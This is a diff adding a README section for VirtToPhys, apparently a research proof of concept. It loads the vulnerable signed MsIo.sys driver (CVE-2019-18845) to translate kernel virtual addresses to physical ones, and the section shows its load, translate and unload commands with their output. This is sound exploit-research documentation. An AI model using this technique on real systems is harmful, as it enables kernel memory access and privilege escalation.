@@ -413,6 +413,73 @@ C:\> Londor.exe -t Coverage -s "C:\Windows\System32\notepad.exe" -o C:\Users\b33
     |-> Wrote trace data to file
 ```
 
+### VirtToPhys
+
+VirtToPhys is a small POC to demonstrate how you can calculate the physical address for a kernel virtual address when exploiting driver bugs that allow you to map physical memory. VirtToPhys uses MsIo.sys, a WHQL signed driver that gives you colorful lights on your RAM (?lolwut), [CVE-2019-18845](https://github.com/active-labs/Advisories/blob/master/2019/ACTIVE-2019-012.md). Hat tips and full credits to [@UlfFrisk](https://twitter.com/UlfFrisk) for his very insightful [MemProcFS](https://github.com/ufrisk/MemProcFS) project and [@hFireF0X](https://twitter.com/hFireF0X) for [KDU](https://github.com/hfiref0x/KDU).
+
+```
+C:\> VirtToPhys.exe -l
+ _   _ _      _ _____    ______ _
+| | | (_)    | |_   _|   | ___ \ |
+| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
+| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
+\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
+ \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
+                                       __/ |
+                                      |___/
+
+                                         ~b33f
+[+] Running as Administrator
+[>] Executing on x64
+[?] Loading MsIo driver..
+[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE
+    |-> Success
+[>] Driver Nt path: \??\C:\Windows\System32\MsIo64.sys
+[>] Driver registration: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsIoTest
+[?] NtLoadDriver -> Success
+[+] Driver load: OK
+
+C:\> VirtToPhys.exe -v 0xffffd20fc9a5f440
+ _   _ _      _ _____    ______ _
+| | | (_)    | |_   _|   | ___ \ |
+| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
+| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
+\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
+ \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
+                                       __/ |
+                                      |___/
+
+                                         ~b33f
+[+] Running as Administrator
+[>] Executing on x64
+[*] MsIO driver handle: 604
+[?] Leaking PML4..
+[+] PML4 in lowstub --> 1AB000
+[?] Converting VA -> PA
+    |-> PhysAddress: 7E25F440
+
+C:\> VirtToPhys.exe -u
+ _   _ _      _ _____    ______ _
+| | | (_)    | |_   _|   | ___ \ |
+| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
+| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
+\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
+ \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
+                                       __/ |
+                                      |___/
+
+                                         ~b33f
+[+] Running as Administrator
+[>] Executing on x64
+[?] UnLoading MsIo driver..
+[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE
+    |-> Success
+[+] NtUnloadDriver -> Success
+[+] Driver deleted from disk
+[+] Driver service artifacts deleted
+[?] Driver unload: OK
+```
+
 ## Windows API
 
 ### GetAPISetMapping
